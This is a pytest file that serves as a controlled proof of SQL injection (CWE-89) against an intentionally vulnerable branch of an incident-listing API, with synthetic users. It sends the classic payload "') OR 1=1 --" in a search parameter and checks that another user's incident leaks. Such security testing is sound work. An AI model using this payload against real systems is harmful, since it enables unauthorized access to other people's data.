"""Positive proof of CWE-89 in the intentionally vulnerable Git branch only.

Run explicitly with:
  RUN_SQLI_EXPERIMENT=1 python -m pytest tests/test_sql_injection_experiment.py -s -q

The ordinary test suite skips this controlled exploit demonstration.
"""

import os

import pytest

from test_incident_service import auth, env  # Reuse synthetic users, database, and RSA test key.


@pytest.mark.skipif(
    os.getenv("RUN_SQLI_EXPERIMENT") != "1",
    reason="Controlled SQL injection proof only; not part of release tests",
)
def test_search_injection_bypasses_alice_ownership_check(env):
    client, _ = env
    payload = "') OR 1=1 --"
    response = client.get(
        "/internal/incidents",
        params={"search": payload},
        headers=auth(env, scope="incident:list", user=1),
    )
    assert response.status_code == 200
    result_ids = [item["id"] for item in response.json()]
    print(f"Injected search exposed incident IDs: {result_ids}")
    assert 102 in result_ids, "Expected to expose Bob's incident ID 102 on vulnerable branch"
